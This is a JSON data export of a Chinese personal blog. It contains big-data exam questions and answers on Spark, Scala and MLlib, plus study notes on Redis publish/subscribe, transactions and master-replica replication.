{"meta":{"title":"Noodles2hg的博客","subtitle":"为了freedom","description":"nothing","author":"Noodles2hg","url":"https://github.com/z-anshun","root":"/"},"pages":[{"title":"categories","date":"2020-10-08T05:07:02.000Z","updated":"2021-09-21T09:09:09.799Z","comments":false,"path":"categories/index.html","permalink":"https://github.com/z-anshun/categories/index.html","excerpt":"","text":""},{"title":"四大皆空","date":"2020-10-08T05:49:37.973Z","updated":"2020-10-08T05:49:37.973Z","comments":true,"path":"/404.html","permalink":"https://github.com/z-anshun/404.html","excerpt":"","text":""},{"title":"about","date":"2020-10-08T05:13:07.000Z","updated":"2021-09-21T09:09:46.072Z","comments":true,"path":"about/index.html","permalink":"https://github.com/z-anshun/about/index.html","excerpt":"","text":"nothing"},{"title":"links","date":"2020-10-08T05:13:07.000Z","updated":"2020-10-08T06:23:45.074Z","comments":true,"path":"links/index.html","permalink":"https://github.com/z-anshun/links/index.html","excerpt":"","text":""},{"title":"","date":"2020-10-07T15:52:46.169Z","updated":"2020-10-07T15:52:46.169Z","comments":true,"path":"js/load-aplayer.js","permalink":"https://github.com/z-anshun/js/load-aplayer.js","excerpt":"","text":"document.addEventListener(\"DOMContentLoaded\", function() { let apContainer = document.createElement(\"div\"); apContainer.id = \"aplayer\"; document.body.append(apContainer); const ap = new APlayer({ container: document.getElementById(\"aplayer\"), fixed: true, audio: [ { name: \"name\", artist: \"artist\", url: \"url.mp3\", cover: \"cover.jpg\", }, ], }); });"},{"title":"tags","date":"2020-10-08T05:03:55.000Z","updated":"2021-09-21T09:09:29.175Z","comments":true,"path":"tags/index.html","permalink":"https://github.com/z-anshun/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-09-21T09:10:16.000Z","updated":"2021-09-21T09:10:31.957Z","comments":true,"path":"friends/index.html","permalink":"https://github.com/z-anshun/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"大数据开发试题","slug":"大数据开发试题","date":"2022-06-29T13:13:36.000Z","updated":"2022-06-29T13:14:23.552Z","comments":true,"path":"2022/06/29/da-shu-ju-kai-fa-shi-ti/","link":"","permalink":"https://github.com/z-anshun/2022/06/29/da-shu-ju-kai-fa-shi-ti/","excerpt":"","text":"基础概念 大数据带来思维方式的三个转变是 相关而非因果 全样而非抽样 效率而非精准 精准而非全面 大数据发展的三个阶段是 低谷期 萌芽期 成熟期 大规模应用期 每种大数据产品都有特定的应用场景，以下哪个产品是用于批处理的 MapReduce 数据产生方式大致经历了三个阶段，包括 运营式系统阶段 感知式系统阶段 用户原创内容阶段 移动互联网数据阶段 图领奖获得者、著名数据库专家Jim Gray博士认为，人类自古以来在科学研究上先后经历了四种范式，具体包括： 计算科学 实验科学 理论科学 数据科学 大数据的四种主要计算模式包括： 流计算 查询分析计算 批处理计算 图计算 框计算 用于流计算的是： S4 大数据处理的数据都是非结构化数据，这种数据更难处理，因此需要使用大数据技术。 错 Scala 语言基础C++、Java等面向对象程序编程语言属于 命令式编程范式； Haskell、Erlang和Lisp等语言属于 函数式 编程范式 for (变量 &lt;- 表达式) {语句块}，其中，“变量&lt;-表达式”被称为 生成器 Scala用了三个包来组织容器类，分别是 scala.collection scala.collection.mutable scala.collection.immutable scala.collection.contains Scala类中所有成员的默认可见性为 公有 Scala中类的方法，如果方法返回类型为 Unit，可以同时省略返回结果类型和等号，但不能省略大括号 Scala采用单例对象（singleton object）来实现与Java静态成员同样的功能；使用 object关键字定义单例对象 当一个单例对象和它的同名类一起出现时，这时的单例对象被称为这个同名类的“ 伴生对象”（companion object）。相应的类被称为这个单例对象的“ 伴生类”。 Scala中如果一个类包含没有实现的成员，则必须使用 abstract关键词进行修饰，定义为 抽象类 只能重载var类型的字段，而不能重载val类型的字段。因为var类型本身就是可变的，所以，可以直接修改它的值，无需重载。 错 Scala中没有接口的概念，而是提供了“ **特质( trait)**”，它不仅实现了接口的功能，还具备了很多其他的特性 Spark 的设计和运行原理 Spark SQL 目前暂时不支持哪种语言？ Matlab Apache软件基金会最重要的三大分布式计算系统开源项目包括 Hadoop Spark Storm MapReduce（用于批处理） Spark 的主要特点包括？ 运行模式多样 运行速度快 容易使用 通用性好 Spark 支持三种不同类型的部署方式 Standalone Spark on Mesos Spark on YARN Spark on Hive Spark在2014年打破了Hadoop保持的基准排序纪录，Spark用十分之 一的计算资源，获得了比Hadoop快 3倍的速度。 Spark容易使用：支持使用Scala、Java、Python和R语言进行编程，可以通过 spark shell 进行交互式编程 Spark生态圈即BDAS（伯克利数据分析栈）包含了Spark Core、Spark SQL、Spark Streaming、MLLib和GraphX等组件， Spark Core提供内存计算框架、 Spark Streaming提供实时处理、 Spark SQL提供即席查询、 MLlib提供机器学习库、 GraphX提供图处理，它们都是由AMP实验室提供，能够无缝的集成并提供一站式解决平台 RDD，全称是 Resilient Distributed Dataset，中文名称是 弹性分布式数据集，是分布式内存的一个抽象概念,提供了一种高度受限的共享内存模型 DAG：是 Directed Acyclic Graph（有向无环图）的简称，反应RDD之间的 依赖关系 Spark中一个作业会分为多组任务，每组任务被称为 阶段，或者也被称为任务集合，代表了一组关联的、相互之间没有Shuffle依赖关系的任务组成的任务集 Spark的一个应用由一个 Driver和若干个 作业构成，一个作业由多个阶段构成，一个阶段由多个没有Shuffle关系的任务组成。 Spark的运行流程中，首先为应用构建起基本的运行环境，即由Driver创建一个 SparkContext，进行资源的申请、任务的分配和监控。 RDD提供了一组丰富的操作以支持常见的数据运算，分为“动作”（ Action）和“转换”（ Transformation）两种类型。 是否包含Shuffle操作是区分 窄依赖和 宽依赖的根据 Spark通过分析各个RDD的依赖关系生成了DAG，再通过分析各个RDD中的分区之间的依赖关系来决定如何划分Stage，具体划分方法是：在DAG中进行反向解析，遇到 宽依赖就断开；遇到 窄依赖就把当前的RDD加入到Stage中；将 窄依赖尽量划分在同一个Stage中，可以实现流水线计算 RDD典型的执行过程如下： （1）RDD读入 外部数据进行创建； （2）RDD经过一系列的 转换（Transformation）操作，每一次都会产生不同的RDD，供给下一个转换操作使用； （3）最后一个RDD经过 动作（Action）操作进行转换，并输出到外部数据源 Spark环境搭建和使用方法 1、Spark 部署模式包括： Local 模式：单机模式 Standalone 模式：使用 Spark 自带的简单集群管理器 YARN 模式：使用 YARN 作为集群管理器 Mesos 模式：使用 Mesos 作为集群管理器 2、Hadoop 和 Spark 可以相互协作，由 Hadoop 的 HDFS、HBase 等组件负责数据的存储和管理，由 Spark 负责数据的 计算 3、Spark Shell 支持 Scala 和 Python 4、Spark的运行模式取决于传递给SparkContext的Master URL的值。Master URL是yarn-client，表示 以 客户端模式连接YARN集群。集群的位置可以在HADOOP_CONF_DIR 环境变量中找到。Master URL是yarn-cluster，表示以 集群模式连接YARN集群。集群的位置可以在HADOOP_CONF_DIR 环境变量中找到 5、在Spark中采用本地模式启动Spark Shell的命令主要包含以下参数： –master：这个参数表示当前的Spark Shell要连接到哪个master，如果是local[*]，就是使用本地模式启动spark-shell，其中，中括号内的星号表示需要使用几个CPU核心(core)，也就是启动几个 线程 模拟Spark集群； –jars： 这个参数用于把相关的JAR包添加到 类路径/classpath中；如果有多个jar包，可以使用逗号分隔符连接它们 6、可以使用命令“**:quit”退出Spark Shell；或者，也可以直接使用“ **Ctrl+D”组合键，退出Spark Shell 7、可以通过spark-submit提交应用程序，该命令的格式如下： ./bin/spark-submit --class &lt;main-class&gt; //需要运行的程序的主类，应用程序的 入口点 --master &lt;master-url&gt; //Master URL --deploy-mode &lt;deploy-mode&gt; //部署模式 ... # other options //其他参数 &lt;application-jar&gt; //应用程序JAR包 [application-arguments] //传递给主类的 主方法 的参数 8、在Master节点主机上运行脚本 start-master.sh可以启动Master节点；在Master节点主机上运行脚本 start-slaves.sh 可以启动所有Slaver节点。 9、用户在独立集群管理Web界面查看应用的运行情况，即：http://master: 8080/； 用户在Hadoop Yarn集群管理Web界面查看所有应用的运行情况，即：http://master: 8088/cluster RDD 编程1、RDD 创建的方式主要有两种方式，可以从 文件系统 创建，也可以用Scala 并行集合/集合/数组/列表/数组和列表/数组、列表/scala集合 创建 2、RDD 分区的作用有：增加 并行度 ，减少 开销 3、对于RDD而言，每一次转换操作都会产生 不同 的RDD，供给下一个 转换 使用 4、转换得到的RDD是 惰性 求值的，也就是说，整个转换过程只是记录了 转换的轨迹，并不会发生真正的计算，只有遇到 行动操作 时，才会发生真正的计算，开始从 血缘关系 源头开始，进行物理的转换操作 5、flatMap(func)，与map()相似，但每个输入元素都可以映射到 0或多个 输出结果 6、一般而言，使用 cache() 方法时，会调用 Persist(MEMORY_ONLY) 7、persist()的圆括号中包含的是持久化级别参数，persist(MEMORY_AND_DISK）表示将RDD作为反序列化的对象存储在JVM中，如果内存不足，超出的分区将会被存放在硬盘上 8、RDD分区的一个原则是使得分区的个数尽量等于集群中的 CPU核心（core）数目。 9、在调用textFile()和parallelize()方法的时候手动指定分区个数即可，语法格式如下： sc.textFile(path, partitionNum) 其中，path参数用于指定要加载的文件的地址，partitionNum参数用于指定 分区个数 10、groupByKey也是对每个key进行操作，但只生成一个 序列，groupByKey本身不能自定义函数，需要先用groupByKey生成RDD，然后才能对此RDD通过map进行自定义函数操作。 11、HBase是一个稀疏、多维度、排序的映射表，这张表的索引是行键、列族、列限定符 和 时间戳 12、HBase的表在水平方向由一个或者多个 列族 组成，一个列族中可以包含 任意多个 列，同一个列族里面的数据存储在一起 13、HBase中执行更新操作时，并不会删除数据旧的版本，而是生成一个新的版本，旧有的版本仍然 保留（这是和HDFS只允许追加不允许修改的特性相关的 14、Spark可以使用 saveAsNewAPIHadoopDataset 这个API将RDD输出到HBase的表中。 15、如果要让Spark读取HBase，就需要使用SparkContext提供的 newAPIHadoopRDD 这个API将表的内容以RDD的形式加载到Spark中 Spark-SQL 1、Spark SQL 是 Spark 中的一个子模块，主要用于操作结构化数据。它具有以下特点： 能够将SQL查询与Spark程序无缝混合，允许您使用SQL或DataFrame API对结构化数据进行查询，支持多种开发语言 支持够达上百种的外部数据源，包括Hive, Avro, Parquet, ORC, JSON 和JDBC等 支持HiveQL语法以及Hive SerDes和UDF，允许你访问现有的Hive库,支持标准的JDBC和ODBC连接 支持优化器，列式存储和代码生成等特性,支持扩展并能保证容错 2、关于 DataFrame、DateSet、RDD 正确的是 RDDs适合非结构化数据的处理,而DataFrame &amp; DataSet更适合结构化数据和半结构化的处理 DataFrame &amp; DataSet可以通过统-的Structured API进行访问，而RDDs则更适合函数式编程的场景 相比于DataFrame而言，DataSet 是强类型的(Typed)，有着更为严格的静态类型检查 DataSets、DataFrames的底层都依赖了 RDDs API,并对外提供结构化的访问接口 3、Spark SQL 产生原因 关系数据库在大数据时代下不再满足需求，朋要从不同的数据源操作不同的数据，包含结构化和非结构化 用户需要执行高级分析,比如机器学习和图形处理等 大数据时代经常需要融合关系查询和复杂粉析算法 关系数据库已经很流行 4、2014年6月1日Shark项目和Spark SQL项目的主持人Reynold Xin宣布：停止对Shark的开发，团队将所有资源放在Spark SQL项目上，至此，Shark的发展画上了句话，但也因此发展出两个直线： Spark SQL和 Hive on Spark 5、Spark SQL增加了 DataFrame（即带有Schema信息的RDD），使用户可以在Spark SQL中执行SQL语句，数据既可以来自RDD，也可以是Hive、HDFS、Cassandra等 外部数据源，还可以是JSON格式的数据 6、从Spark2.0以上版本开始，Spark使用全新的 SparkSession接口替代Spark1.6中的SQLContext及HiveContext接口来实现其对数据加载、转换、处理等功能。SparkSession实现了SQLContext及HiveContext所有功能 7、Spark SQL在Hive兼容层面仅依赖 HiveQL解析、 Hive元数据，也就是说，从HiveQL被解析成抽象语法树（AST）起，就全部由Spark SQL接管了。Spark SQL执行计划生成和优化都由 Catalyst（函数式关系查询优化框架）负责。 8、Spark SQL目前支持 Scala、 JAVA、 Python三种语言，支持SQL-92规范 9、可以通过如下语句创建一个SparkSession对象： scala&gt; import org.apache.spark.sql.SparkSession scala&gt; val spark= SparkSession.builder().getOrCreate() 10、在创建DataFrame之前，为了支持RDD转换为DataFrame及后续的SQL操作，需要通过import语句（即 import spark.implicits._）导入相应的包，启用隐式转换 11、Spark官网提供了两种方法来实现从RDD转换得到DataFrame： 第一种方法是，利用 反射来推断包含特定类型对象的RDD的schema，适用对已知数据结构的RDD转换 第二种方法是，使用 编程接口，构造一个schema并将其应用在已知的RDD上 12、在利用反射机制推断RDD模式时，需要首先定义一个 case class，因为，只有 case class才能被Spark隐式地转换为DataFrame 13、scala&gt; peopleDF.createOrReplaceTempView(\"\") //必须注册为临时表才能供下面的查询使用 14、要读取people.json文件生成DataFrame，可以使用下面哪些命令： spark.read.json(“people.json”) spark.read.format(“json”).load(“people.json”) spark.read.parquet(“people.json”) 15、从RDD转换得到DataFrame包含两种典型方法，分别是： 利用反射机制推断RDD模式 利用编程方式定义RDD模式 利用投影机制推断RDD模式 利用互联机制推断RDD模式 16、使用编程方式定义RDD模式时，主要包括哪三个步骤： 制作”表头” 制作”表中的记录” 把”表头”和”表中的记录”拼装在一起 制作映射表 Spark-Steaming1、对于一个流系统来讲，其应该达到下列要求： 高性能、海量式 实时性、分布式 易用性、可靠性 通用性、智能性 2、流系统的处理流程包括三个阶段: 数据实时采集； 数据实时计算； 实时查询服务 3、Spark Streaming和Storm的最大区别在于，Spark Streaming 无法实现 毫秒级的流计算。 4、Spark Streaming 的基本输入源： 文件流、 套接字流、 RDD队列流 5、编写Spark Streaming程序的基本步骤是 通过创建输入DStream来定义输入源 通过对DStream应用转换操作和输出操作来定义流计算 用streamingContext.start()来开始接收数据和处理流程 通过streamingContext.awaitTermination()方法来等待处理结束（手动结束或因为错误而结束） 可以通过streamingContext.stop()来手动结束流计算进程 6、流处理系统无需用户主动发出查询，实时查询服务可以主动将实时结果 推送给用户。 7、在Spark Streaming中，会有一个组件 Receiver，作为一个长期运行的task跑在一个Executor上 8、DStream有状态转换操作中， 滑动窗口转换操作中： 窗口长度L表示： 运算的数据量/持续时间 滑动时间间隔G表示： 控制每隔多长时间做一次运算/间隔时间 每隔G秒表示： 统计最近L秒的数据/最近L秒 9、DSream 代表了一系列连续的RDD，DStream中每个RDD包含特定时间间隔的数据，一个DStream 对应了时间维度上的 多个RDD；DStream 作为Spark Stream的一个基本抽象，提供了高层的API来进行Spark Streaming 程序开发 10、如果是编写一个独立的Spark Streaming程序，而不是在spark-shell中运行，则需要通过如下方式创建StreamingContext对象（1秒作为窗口计算时间）： import org.apache.spark._ import org.apache.spark.streaming._ val conf = new SparkConf().setAppName(\"TestDStream\").setMaster(\"local[2]\") val ssc = new StreamingContext(conf,Seconds(1)) 11、Kafka是一种高吞吐量的分布式 发布订阅消息系统，用户通过Kafka系统可以发布大量的消息，同时也能实时订阅消费消息。 12、DStream有状态转换操作包括哪两种： 滑动窗口转换操作 updateStateByKey 操作 update操作 reduceByKey操作 Spark-MLib1、机器学习强调三个关键词： 算法； 经验； 性能。 2、MLlib目前支持4种常见的机器学习问题: 分类； 回归； 聚类； 协同过滤 3、Spark MLlib主要包含的四种数据类型是： 本地向量集/vector ；向量标签/LabeledPoint； 本地矩阵/Matrix； 分布式矩阵/DistributedMatrix 4、MLlib 由 4 部分组成： 数据类型； 数学统计计算库； 算法评测； 机器学习算法 5、下面论述中错误的是：A A. 机器学习和人工智能是不存在关联关系的两个独立领域 B. 机器学习强调三个关键词：算法、经验、性能 C. 推荐系统、金融反欺诈、语音识别、自然语言处理和机器翻译、模式识别、智能控制等领域，都用到了机器学习的知识 D. 机器学习可以看作是一门人工智能的科学，该领域的主要研究对象是人工智能 6、下面关于机器学习处理过程的描述，错误的是：D A. 在数据的基础上，通过算法构建出模型并对模型进行评估 B. 评估的性能如果达到要求，就用该模型来测试其他的数据 C. 评估的性能如果达不到要求，就要调整算法来重新建立模型，再次进行评估 D. 通过算法构建出的模型不需要评估就可以用于其他数据的测试 7、下面关于机器学习流水线(PipeLine)的描述，错误的是：D A. 流水线将多个工作流阶段（转换器和评估器）连接在一起，形成机器学习的工作流，并获得结果输出 B. 要构建一个机器学习流水线，首先需要定义流水线中的各个PipelineStage C. PipelineStage称为工作流阶段，包括转换器和评估器，比如指标提取和转换模型训练等 D. 流水线构建好以后，就是一个转换器（Transformer） 8、下面关于评估器（Estimator）的描述错误的是：C A. 评估器是学习算法或在训练数据上的训练方法的概念抽象 B. 在机器学习流水线里，评估器通常是被用来操作 DataFrame数据并生成一个转换器 C. 评估器实现了方法transfrom()，它接受一个DataFrame并产生一个转换器 D. 评估器实现了方法fit()，它接受一个DataFrame并产生一个转换器 9、下面关于转换器（Transformer）的描述错误的是：B A. 转换器是一种可以将一个DataFrame转换为另一个DataFrame的算法 B. 技术上，转换器实现了一个方法fit()，它通过附加一个或多个列，将一个DataFrame转换为另一个DataFrame C. 一个模型就是一个转换器，它把一个不包含预测标签的测试数据集DataFrame打上标签，转化成另一个包含预测标签的 DataFrame D. 技术上，转换器实现了一个方法transform()，它通过附加一个或多个列，将一个DataFrame转换为另一个DataFrame 10、下面的论述中，正确的是：AB A. 传统的机器学习算法，由于技术和单机存储的限制，大多只能在少量数据上使用 B. 利用MapReduce框架在全量数据上进行机器学习，这在一定程度上解决了统计随机性的问题，提高了机器学习的精度 C. MapReduce可以高效支持迭代计算 D. Spark无法高效支持迭代计算 11、下面关于Spark MLlib库的描述正确的是：AC A. MLlib库从1.2版本以后分为两个包：spark.mllib和spark.ml B. spark.mllib包含基于DataFrame的原始算法API C. spark.mllib包含基于RDD的原始算法API D. spark.ml则提供了基于RDD的、高层次的API 12、下面论述中正确的是：ABC A. DataFrame可容纳各种数据类型，与RDD数据集相比，它包含了模式（schema）信息，类似于传统数据库中的二维表格 B. 流水线用DataFrame来存储源数据 C. 转换器（Transformer）是一种可以将一个DataFrame转换为另一个DataFrame的算法 D. 评估器（Estimator）是一种可以将一个DataFrame转换为另一个DataFrame的算法","categories":[{"name":"学校","slug":"学校","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E6%A0%A1/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"https://github.com/z-anshun/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"独立功能的实现","slug":"独立功能的实现","date":"2022-04-09T12:24:12.000Z","updated":"2022-04-09T12:24:43.889Z","comments":true,"path":"2022/04/09/du-li-gong-neng-de-shi-xian/","link":"","permalink":"https://github.com/z-anshun/2022/04/09/du-li-gong-neng-de-shi-xian/","excerpt":"","text":"发布与订阅Redis 的发布和订阅功能由 PUBLISH、SUBSCRIBE、PSUBSCRIBE 等命令组成 SUBSCRIBE 和 PSUBSCRIBE的区别在于，PSUBSCRIBE 可以使用匹配符进行订阅，如：PSUBSCRIBE news.* 频道的订阅和退订当客户端执行 SUBSCRIBE 命令订阅某个或某些频道时，这个客户端就会和频道建立起一种订阅的关系，并且这种关系都保存在服务器状态的 pubsub_channels 字典里面 其键为某个订阅的频道；值为一个链表，记录所有订阅这个频道的客户端 struct redisServer{ // ... // 保存所有频道的订阅关系 dict *pubsub_channels; // ... }; 订阅频道 当客户端执行 SUBSCRIBE 命令时，服务器都会将这个客户端与频道关联起来 即：若该频道已有其它客户端订阅，那么将这个客户端信息放在链表末尾就行；反之久创建一个键，然后加入字典即可 伪代码实现： def subscribe(*all_input_channels): # 遍历输入的所有频道 for channel in all_input_channels: # 如果还未有过订阅者 if channel not in server.pubsub_channels: server.pubsub_channels[channel]=[] server.pubsub_channels[channel].append(client) 退订频道 UNSUBSCRIBE 命令跟 SUBSCRIBE 相反，服务器从 pubsub_channels 中解除与客户之间的关联 伪代码实现： def unsubscribe(*all_input_channels): # 遍历所有要退订的频道 for channel in all_input_channels: server.pubsub_channels[channel].remove(client) if len(server.pubsub_channels[channel])==0: server.pubsub_channels.remove(channel) 模式的订阅和退订模式的订阅关系都保存在服务器状态的 pubsub_patterns 属性里面： struct redisServer{ // ... list *pubsub_patterns; // ... }; pubsub_patterns 属性为一个链表，链表中的每一个节点都包含着一个 pubsubPattern 结构，这个结构的pattern 属性记录了被订阅的模式，client属性记录订阅模式的客户端 typedef struct pubsubPattern{ // 订阅模式的客户端 redisClient *client; // 被订阅的模式 robj *pattern; }pubsubPattern; 订阅模式 伪代码实现： def psubscribe(*all_input_patterns): for pattern in all_input_patterns: # 创建新的 pubsubPattern 结构 pubsubPattern = create_new_pubsubPattern() pubsubPattern.client=client pubsubPattern.pattern=pattern server.pubsub_patterns.append(pubsubPattern) 退订模式 PUNSUBSCRIBE 伪代码实现： def pubsubscribe(*all_input_patterns): for pattern in all_input_patterns: for pubsubPattern in server.pubsub_patterns: if client==pubsubPattern.cliten and pattern==pubsubPattern.pattern: server.pubsub_patterns.remove(pubsubPattern) 发送消息客户端执行 PUBLISH &lt;channel&gt; &lt;message&gt;命令时，会有下面两个动作： 将message发送给channel频道的所有订阅者，dict直接匹配 如果一个或多个模式pattern与频道匹配，也会将message发送；遍历 pubsub_patterns 链表，查找匹配的，然后发送 查看订阅信息PUBSUB CHANNELS PUBSUB CHANNELS [pattern] 返回服务器当前被订阅的频道，其 pattern 为可选 如果不给定 pattern ，服务器就会返回当前被订阅的所有频道 给定，就会只返回跟 pattern 匹配的那些频道 这个子命令是通过遍历服务器 pubsub_channels 字典的所有键来返回对应的内容 PUBSUB NUMSUB PUBSUB NUMSUB [channel-1 channel-2 ... channel-n]接收多个频道作为参数，并返回这些频道的订阅者数量 PUBSUB NUMPAT PUBSUB NUMPAT 返回服务器当前被订阅模式的数量，即使，len(server.pubsub_patterns) 事务Redis 通过 MULTI、EXEC、WATCH等命令来实现事务（transaction）功能，事务执行期间，服务器不会中途去执行其它客户端的命令请求，直到命令都执行完毕后，才会继续执行 以 MULTI 命令开始，EXEC 提交 事务的实现一个事务从开始到实现，会经历下面三个阶段： 事务开始 命令入队 事务执行 事务开始 redis&gt; MULTI ok 这一命令会将客户端从非事务状态切换为事务状态，即将客户端状态的 flags 属性中打开 REDIS_MULTI 标识 伪代码实现： def MULTI(): client.flags |= REDIS_MULTI replyOK() 命令入队 除开 EXEC、DISCARD、WATCH、MULTI四个命令，当开启事务后，都是入队，然后客户端返回一个 QUEUED 回复 事务队列 每个 Redis 客户端都有自己的事务状态，这个事务状态保存在客户端状态的 mstate 属性里面： typedef struct redisClient{ // ... // 事务状态 // MULTI/EXEC state multiState mstate; // ... } redisClient; typedef struct multiState{ // 事务队列，FIFO顺序 multiCmd *commands; // 已入队的命令数 int count; }multiState; typedef struct multiCmd{ // 参数 robj **argv; // 参数数量 int agrc; // 命令指针 struct redisCommand *cmd; }multiCmd; 执行事务 发送EXEC 命令时，这个EXEC命令会马上被执行，然后执行事务队列中的命令，并将结果按顺序返回 WATCH 命令的实现WATCH 命令是一个乐观锁（optimistic locking），它能在EXEC命令执行之前，监视任意数量的数据库键，并在EXEC时，检查被监视的键是否至少有一个已经被修改过了，如果是，就拒绝执行事务，返回客户端空 上面就会拒绝客户端A的EXEC命令 使用WATCH 监视数据库键 每个Redis 数据库都保存着一个 watch_keys 字典，这个字典的键是某个被 WATCH 命令监视的数据库键；值为一个链表，记录监视该键的客户端 typedef struct redisDb{ // ... dict *watched_key; // ... }redisDb; 监视机制的触发 所有对数据进行修改的命令，如 SET、LPUSH、SADD、ZREM、DEL、FLUSHDB等，在执行之后都会调用 multi.c/touchWatchKey 函数对 watched_keys 字典进行检查，如果有客户端对该键进行监视着，就会将客户端的 REDIS_DIRTY_CAS 标识打开，表示该客户端的事务安全性已经被破坏 伪代码实现： def touchWatchKey(db,key): if key in watched_keys: for client in db.watched_keys[key]: client.flags |= REDIS_DIRTY_CAS 判断事务是否安全 当服务器收到一个客户端发来的 EXEC 命令时，就会判断这个客户端是否打开了 REDIS_DIRTY_CAS 标识来决定是否要执行事务，如果打开了，就拒绝；反之就安全，就执行 事务的ACID性质原子性 事务中的命令，要么全部执行，要么全部不执行 Redis也是这样，当某个命令入队失败了，也不会给予执行，但是Redis执行错误了，不会回退，也就是不支持回滚机制，因为这样不符合它简单高效的设计主旨 一致性 执行前后，满足数据本身的要求，无错误的数据 Redis 通过谨慎的错误检测和简单的设计来保证事务的一致性 入队错误 如果一个事务在入队命令过程中，出现了命令不存在，或者命令的格式不正确时，Redis会拒绝执行这个事务 注意：2.6.5之前，是忽略入队错误 执行错误 出错的命令，不会被执行 服务器停机 根据持久化进行恢复 隔离性 Redis 使用单线程来执行事务，事务之间肯定是单线程了 永久性 根据持久化模式进行持久 Lua脚本2.6版本后，引入了对Lua脚本的支持 排序SORT 命令对列表键、集合键或者有序集合的值进行排序 如： redis&gt; RPUSH number 5 3 1 4 2 (integer) 5 redis&gt; SORT number 1) \"1\" 2) \"2\" 3) \"3\" 4) \"4\" 5) \"5\"","categories":[{"name":"redis","slug":"redis","permalink":"https://github.com/z-anshun/categories/redis/"}],"tags":[{"name":"books","slug":"books","permalink":"https://github.com/z-anshun/tags/books/"},{"name":"redis设计与实现","slug":"redis设计与实现","permalink":"https://github.com/z-anshun/tags/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"}]},{"title":"多机数据库","slug":"多机数据库","date":"2022-04-08T17:22:12.000Z","updated":"2022-04-09T12:25:26.534Z","comments":true,"path":"2022/04/09/duo-ji-shu-ju-ku/","link":"","permalink":"https://github.com/z-anshun/2022/04/09/duo-ji-shu-ju-ku/","excerpt":"","text":"复制用户通过执行 SLAVEOF 命令或设置 slaveof 选项，会让一个服务器成为另一个服务器的从服务器 如： 127.0.0.1:12345&gt; SLAVEOF 127.0.0.1 6379 127.0.0.1:12345 就会成为 127.0.0.1:6379 的从服务器 旧版复制功能的实现Redis 的复制分为同步（sync）和命令传播（command propagate）两个操作： 同步用于将从更新至主服务得状态 命令传播用于主给从传播命令，达到状态更新 同步 当客户端向从服务器发送 SLAVEOF 命令，要求从服务器复制主服务器时，会首先向主服务器进行同步 步骤： 从向主发送SYNC命令 主收到SYNC后，执行 BGSAVE 命令，生成RDB文件，并使用一个缓冲区记录从现在开始得写命令 当主执行完BGSAVE命令后，将生成RDB发送给从，然后从载入对应的RDB文件 主将缓冲区的命令发送给从 命令传播 主从服务器为了保持一致性，主服务器会将写入的新命令发给从服务器 旧版复制功能的缺陷从对主的SYNC只有下面两种情况： 初次复制：从以前从未复制过任何主，或者从当前要复制的主和上一次的不同 断线后重复制：从断线后，自动又连上主服务器 很明显，初次复制使用SYNC还行，但是断线后重复制来说，效率就显得很低了 新版复制功能的实现为了解决旧版断线后复制的缺陷，后续版本使用 PSYNC 代替 SYNC 命令来执行复制时的同步操作 PSYNC 具有完整重同步（full resynchronization）和部分重同步（partial resynchronization）两种模式： 完整同步用于处理初次复制的情况，跟SYNC命令的执行步骤基本一样 部分同步用于处理断线后重复制的情况，将断开连接期间执行的写命令发送给从服务器，那么从服务器只用接收并执行这些写命令即可 部分重同步的实现部分重同步功能主要由下面三个部分组成： 主的复制偏移量（replication offset）和从的复制偏移量 主的复制积压缓冲区（replication backlog） 服务器的运行ID（run ID） 复制偏移量 执行复制的双方，即主从都会维护一个偏移量： 主每次向从传播N个字节的数据时，就会将自己的偏移量的值加上N 从收到主传播来的N个字节的数据时，也会将自己的复制偏移量加上N 那么，通过对比主从的偏移量，就能知道当前两个服务器的状态是否处于一致了 复制积压缓冲区 由主服务器维护的一个固定长度（fixed-size）先进先出（FIFO）队列，默认大小为1MB 当服务器进行命令传播时，不仅会将写命令发送给所有从服务器，还会将其入队到复制积压缓冲区里 因此，主服务器就会保存着一部分最近传播的写命令，并且复制积压缓冲区还会为队列中的每个字节记录相应的复制偏移量 因此，当从重新连接上主时，从会通过 PSYNC 命令将自己的offset发送给主，主服务器会根据这个offset来判断执行何种操作： 如果offset之后的数据在复制积压缓冲区里，那么就执行部分同步操作 如果不在，就全同步 注意：复制积压缓冲区的默认为1MB，但如果主服务器执行的写操作过多，而且从断开的时间过长，那么这个显然时不恰当的，需要进行调整，一般设置为 2*second*write_size_per_second，这里的second为重连的平均时间，write_size_per_second为主服务器平均每秒产生写命令的数据量（协议格式的些命令的长度）,这样绝大多数都能实现部分同步 服务器运行ID 除了复制偏移量和复制积压缓冲区之外，实现部分重同步还需要用到服务器运行ID（run ID）: 每个服务器，无论主从，都会有自己运行的ID 运行的ID会在运行时自动生成，由40个随机的16进制字符组成 当从对主进行初次复制时，主服务器会将自己运行ID传送给从服务器，而从则会将这个运行ID保存起来 那么在重连时，从服务器则会将这个ID发送给主，如果当前主的ID与从发送过来的一样，则尝试部分复制，反之就是SYNC PSYNC 命令的实现在了解了服务器运行ID、复制偏移量和复制积压缓冲区后，就能理解 PSYNC 命令的完整细节了 PSYNC 命令的调用方法有两种： 如果从没有复制过主，或者之前执行过 SLAVEOF no one命令，那么从会开始一次新的复制时将向主发送PSYNC ? -1命令，请求完整同步 如果从已经复制过某个主机，那么在开启一次新的复制时，将向主发送PSYNC &lt;runid&gt; &lt;offset&gt; 根据收到的 PSYNC ，主服务器会回复下面三种的某一种： +FULLRESYNC &lt;runid&gt; &lt;offset&gt;：执行完整同步操作，offset为主服务器当前的复制偏移量 +CONTINUE ?：执行部分同步操作 -ERR：主服务器版本过低，无法识别PSYNC命令，进而从会再向主发送SYNC命令 复制的实现SLAVEOF &lt;master_ip&gt; &lt;master_port&gt; 让从复制一个主服务器 1. 设置主服务器的地址和端口 执行SLAVEOF &lt;master_ip&gt; &lt;master_port&gt; 命令后，从服务器会保证设置的 ip和端口 struct redisServer{ // ... char *masterhost; int masterport; // ... } SLAVEOF 命令为一个异步命令，在完成对应的属性设置后，服务器会向客户端返回一个OK，而真正的复制工作会在OK返回之后真正执行 2. 建立套接字连接 SLAVEOF 命令执行之后，从会根据ip和端口，创建与主服务器的套接字连接 3. 发送PING命令 从服务器成为主的客户端后，做的第一件事就是向主发送一个PING命令 PING有两个作用： 检查套接字的读写是否正常 